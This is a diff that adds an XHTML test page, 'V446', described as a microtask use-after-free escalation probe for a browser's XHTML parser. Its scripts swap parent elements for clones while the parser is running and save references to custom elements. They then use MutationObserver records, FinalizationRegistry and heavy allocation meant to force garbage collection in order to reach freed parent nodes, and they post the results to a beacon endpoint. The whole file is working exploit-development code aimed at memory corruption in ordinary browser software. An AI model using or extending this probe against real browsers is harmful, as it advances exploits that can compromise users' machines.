@@ -1,0 +1,375 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>V446</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<script type="text/javascript"><![CDATA[
+// V446: XHTML microtask UAF escalation probe
+//
+// V444 CONFIRMED: MO can replace m_currentNode with clone at :822.
+// Parser builds into detached OLD node. Safety check passes.
+//
+// This probe tests whether we can:
+// 1. Capture JS ref to a child built into detached OLD node
+// 2. Check if child.parentNode survives or is nulled after parent freed
+// 3. Force parent free via popCurrentNode deref
+// 4. Access dangling m_parentNode for UAF
+
+var BQ = 0;
+function B(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", "/beacon/V446-" + tag + "?q=" + (BQ++), false);
+    x.setRequestHeader("Content-Type", "text/plain");
+    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
+  } catch(e) {}
+}
+
+B("BOOT");
+
+var ceLog = [];
+var savedRefs = {};
+
+// ═══════════════════════════════════════════════════════════════════
+// T1: CE saves `this` in global. After parse, check parentNode.
+// ═══════════════════════════════════════════════════════════════════
+// MO replaces e1-parent with clone at microtask checkpoint.
+// Parser appends e1-ce to detached OLD e1-parent.
+// CE constructor saves `this`.
+// After parse: is savedRefs.e1.parentNode the OLD node, null, or crash?
+
+class E1CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("E1-ctor");
+    savedRefs.e1 = this;
+  }
+}
+customElements.define("e1-ce", E1CE);
+
+// ═══════════════════════════════════════════════════════════════════
+// T2: Nested CEs — outer saved, inner saved. Check parent chain.
+// ═══════════════════════════════════════════════════════════════════
+// Both outer and inner CE save `this`.
+// After parse: inner.parentNode should be outer (both in detached tree).
+// outer.parentNode should be OLD e2-parent (detached, possibly freed).
+
+class E2Outer extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("E2-outer-ctor");
+    savedRefs.e2outer = this;
+  }
+}
+customElements.define("e2-outer", E2Outer);
+
+class E2Inner extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("E2-inner-ctor");
+    savedRefs.e2inner = this;
+  }
+}
+customElements.define("e2-inner", E2Inner);
+
+// ═══════════════════════════════════════════════════════════════════
+// T3: MO on OLD node to capture addedNodes records
+// ═══════════════════════════════════════════════════════════════════
+// Register MO on OLD node during the swap callback.
+// When parser appends children to OLD node, MO queues records.
+// Records hold strong refs to addedNodes.
+// Check if records survive after parse and if nodes are accessible.
+
+var e3Records = null;
+var e3MO = null;
+
+class E3CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("E3-ctor");
+    savedRefs.e3 = this;
+  }
+}
+customElements.define("e3-ce", E3CE);
+
+// ═══════════════════════════════════════════════════════════════════
+// T4: GC + FR after parse to detect parent freed
+// ═══════════════════════════════════════════════════════════════════
+// Register FR on OLD node during swap callback.
+// After parse, trigger GC. If FR fires → OLD node was collected.
+// Then check savedRefs.e4.parentNode → dangling or null?
+
+var e4FRFired = false;
+var e4OldNodeRef = null; // weak-ish: we'll null this and check FR
+
+class E4CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("E4-ctor");
+    savedRefs.e4 = this;
+  }
+}
+customElements.define("e4-ce", E4CE);
+
+// ═══════════════════════════════════════════════════════════════════
+// T5: Access parentNode DURING endElementNs (via CE connectedCallback)
+// ═══════════════════════════════════════════════════════════════════
+// If parser reconnects a node (e.g., adoptNode back), connectedCallback fires.
+// Test if any callback fires during pop that lets us read parentNode.
+
+class E5CE extends HTMLElement {
+  constructor() {
+    super();
+    ceLog.push("E5-ctor");
+    savedRefs.e5 = this;
+  }
+  connectedCallback() {
+    ceLog.push("E5-connected;parent=" + (this.parentNode ? this.parentNode.nodeName : "null"));
+  }
+  disconnectedCallback() {
+    ceLog.push("E5-disconnected");
+  }
+}
+customElements.define("e5-ce", E5CE);
+
+]]></script>
+</head>
+<body>
+
+<!-- T1: Simple capture + parentNode check -->
+<div id="e1-outer">
+  <div id="e1-parent">
+    <script type="text/javascript"><![CDATA[
+    Promise.resolve().then(function() {
+      ceLog.push("E1-swap");
+      var p = document.getElementById("e1-parent");
+      if (p && p.parentNode) {
+        var clone = p.cloneNode(false);
+        clone.id = "e1-clone";
+        p.parentNode.replaceChild(clone, p);
+        ceLog.push("E1-swapped");
+        // p is now detached, only parser ref remains
+        // DO NOT store p — let the ref die with this function frame
+      }
+    });
+    ]]></script>
+    <e1-ce>e1-child</e1-ce>
+    <div id="e1-after">after</div>
+  </div>
+</div>
+
+<!-- T2: Nested CEs in detached subtree -->
+<div id="e2-outer-div">
+  <div id="e2-parent">
+    <script type="text/javascript"><![CDATA[
+    Promise.resolve().then(function() {
+      ceLog.push("E2-swap");
+      var p = document.getElementById("e2-parent");
+      if (p && p.parentNode) {
+        var clone = p.cloneNode(false);
+        clone.id = "e2-clone";
+        p.parentNode.replaceChild(clone, p);
+        ceLog.push("E2-swapped");
+      }
+    });
+    ]]></script>
+    <e2-outer>
+      <e2-inner>nested</e2-inner>
+    </e2-outer>
+  </div>
+</div>
+
+<!-- T3: MO on OLD node captures addedNodes -->
+<div id="e3-outer">
+  <div id="e3-parent">
+    <div id="e3-trigger">trigger</div>
+    <script type="text/javascript"><![CDATA[
+    // Arm MO on e3-trigger to fire at next microtask checkpoint
+    if (typeof MutationObserver !== "undefined") {
+      var trigger3 = document.getElementById("e3-trigger");
+      var swapMO = new MutationObserver(function() {
+        ceLog.push("E3-swap-MO");
+        var p = document.getElementById("e3-parent");
+        if (p && p.parentNode) {
+          // Register child-observing MO on OLD node BEFORE swap
+          e3MO = new MutationObserver(function(records) {
+            e3Records = records;
+            ceLog.push("E3-child-MO;records=" + records.length);
+          });
+          e3MO.observe(p, { childList: true });
+
+          // Now swap
+          var clone = p.cloneNode(false);
+          clone.id = "e3-clone";
+          p.parentNode.replaceChild(clone, p);
+          ceLog.push("E3-swapped;mo-on-old=true");
+        }
+      });
+      swapMO.observe(trigger3, { childList: true });
+      trigger3.appendChild(document.createTextNode("go"));
+    }
+    ]]></script>
+    <e3-ce>e3-child</e3-ce>
+    <div id="e3-after">after</div>
+  </div>
+</div>
+
+<!-- T4: FR on OLD node to detect collection -->
+<div id="e4-outer">
+  <div id="e4-parent">
+    <script type="text/javascript"><![CDATA[
+    Promise.resolve().then(function() {
+      ceLog.push("E4-swap");
+      var p = document.getElementById("e4-parent");
+      if (p && p.parentNode) {
+        // Register FR on OLD node
+        var fr4 = new FinalizationRegistry(function(val) {
+          e4FRFired = true;
+          ceLog.push("E4-FR-FIRED=" + val);
+        });
+        fr4.register(p, "e4-old-parent");
+
+        var clone = p.cloneNode(false);
+        clone.id = "e4-clone";
+        p.parentNode.replaceChild(clone, p);
+        ceLog.push("E4-swapped;fr-registered");
+        // p ref dies here with function frame
+      }
+    });
+    ]]></script>
+    <e4-ce>e4-child</e4-ce>
+  </div>
+</div>
+
+<!-- T5: connectedCallback/disconnectedCallback on detached CE -->
+<div id="e5-outer">
+  <div id="e5-parent">
+    <script type="text/javascript"><![CDATA[
+    Promise.resolve().then(function() {
+      ceLog.push("E5-swap");
+      var p = document.getElementById("e5-parent");
+      if (p && p.parentNode) {
+        var clone = p.cloneNode(false);
+        clone.id = "e5-clone";
+        p.parentNode.replaceChild(clone, p);
+        ceLog.push("E5-swapped");
+      }
+    });
+    ]]></script>
+    <e5-ce>e5-child</e5-ce>
+  </div>
+</div>
+
+<!-- ═══ Post-parse analysis ═══ -->
+<script type="text/javascript"><![CDATA[
+B("PARSED");
+B("CE-LOG", ceLog.join("|"));
+
+// T1: Check saved child's parentNode
+try {
+  var e1 = savedRefs.e1;
+  if (e1) {
+    var pn = e1.parentNode;
+    B("T1-PARENT", JSON.stringify({
+      exists: !!pn,
+      nodeName: pn ? pn.nodeName : "null",
+      id: pn ? pn.id : "null",
+      connected: pn ? pn.isConnected : "null",
+      childConnected: e1.isConnected,
+      // Try to read parent's properties — UAF signal if crash
+      parentChildren: pn ? pn.childNodes.length : -1
+    }));
+  } else {
+    B("T1-PARENT", "no-saved-ref");
+  }
+} catch(e) { B("T1-ERR", e.message.slice(0,60)); }
+
+// T2: Check nested parent chain
+try {
+  var e2o = savedRefs.e2outer;
+  var e2i = savedRefs.e2inner;
+  B("T2-CHAIN", JSON.stringify({
+    outerExists: !!e2o,
+    innerExists: !!e2i,
+    innerParent: e2i && e2i.parentNode ? e2i.parentNode.nodeName : "null",
+    innerParentIsOuter: e2i && e2i.parentNode === e2o,
+    outerParent: e2o && e2o.parentNode ? e2o.parentNode.nodeName : "null",
+    outerParentId: e2o && e2o.parentNode ? e2o.parentNode.id : "null",
+    outerParentConnected: e2o && e2o.parentNode ? e2o.parentNode.isConnected : "null",
+    outerConnected: e2o ? e2o.isConnected : "null"
+  }));
+} catch(e) { B("T2-ERR", e.message.slice(0,60)); }
+
+// T3: Check MO records
+try {
+  // Force delivery of pending MO records
+  if (e3MO) {
+    var pending = e3MO.takeRecords();
+    if (pending.length > 0) e3Records = pending;
+  }
+  B("T3-RECORDS", JSON.stringify({
+    hasRecords: !!e3Records,
+    count: e3Records ? e3Records.length : 0,
+    firstAdded: e3Records && e3Records[0] ? e3Records[0].addedNodes.length : -1,
+    firstTarget: e3Records && e3Records[0] && e3Records[0].target ? e3Records[0].target.id : "null",
+    targetConnected: e3Records && e3Records[0] && e3Records[0].target ? e3Records[0].target.isConnected : "null"
+  }));
+} catch(e) { B("T3-ERR", e.message.slice(0,60)); }
+
+// T4: Force GC and check FR + parentNode
+try {
+  // Heavy GC
+  for (var i = 0; i < 100000; i++) { new ArrayBuffer(256); }
+
+  B("T4-BEFORE-GC", JSON.stringify({
+    frFired: e4FRFired,
+    childExists: !!savedRefs.e4,
+    parentExists: savedRefs.e4 ? !!savedRefs.e4.parentNode : "no-child"
+  }));
+
+  // Even more GC
+  for (var j = 0; j < 200000; j++) { new ArrayBuffer(512); }
+
+  B("T4-AFTER-GC", JSON.stringify({
+    frFired: e4FRFired,
+    childExists: !!savedRefs.e4,
+    parentExists: savedRefs.e4 ? !!savedRefs.e4.parentNode : "no-child",
+    parentNodeName: savedRefs.e4 && savedRefs.e4.parentNode ? savedRefs.e4.parentNode.nodeName : "null",
+    parentId: savedRefs.e4 && savedRefs.e4.parentNode ? savedRefs.e4.parentNode.id : "null"
+  }));
+} catch(e) { B("T4-ERR", e.message.slice(0,60)); }
+
+// T5: Check connected/disconnected callbacks
+try {
+  var e5 = savedRefs.e5;
+  B("T5-LIFECYCLE", JSON.stringify({
+    exists: !!e5,
+    connected: e5 ? e5.isConnected : "null",
+    parentExists: e5 ? !!e5.parentNode : "null",
+    parentName: e5 && e5.parentNode ? e5.parentNode.nodeName : "null"
+  }));
+} catch(e) { B("T5-ERR", e.message.slice(0,60)); }
+
+// Global: try to access all saved nodes' parentNode chains
+try {
+  var chains = {};
+  for (var key in savedRefs) {
+    var node = savedRefs[key];
+    var chain = [];
+    var cur = node;
+    var depth = 0;
+    while (cur && depth < 10) {
+      chain.push(cur.nodeName + (cur.id ? "#" + cur.id : ""));
+      cur = cur.parentNode;
+      depth++;
+    }
+    chains[key] = chain.join(" > ");
+  }
+  B("CHAINS", JSON.stringify(chains));
+} catch(e) { B("CHAINS-ERR", e.message.slice(0,60)); }
+
+B("ALIVE", "all-tests-completed");
+B("DONE");
+]]></script>
+</body>
+</html>
